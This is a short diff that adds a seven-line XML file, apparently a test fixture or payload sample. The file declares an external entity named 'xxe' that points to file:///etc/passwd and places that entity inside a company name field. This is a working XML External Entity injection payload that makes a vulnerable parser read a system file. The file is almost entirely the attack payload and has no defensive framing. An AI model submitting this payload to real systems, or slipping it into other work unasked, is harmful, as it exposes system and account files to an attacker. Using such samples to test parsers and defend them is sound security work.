@@ -1,0 +1,7 @@
+<!DOCTYPE item [ <!ELEMENT item ANY >
+<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
+<company>
+    <name> &xxe; </name>
+    <date> Establish Apr </date>
+    <year> 2015 </year>
+</company>
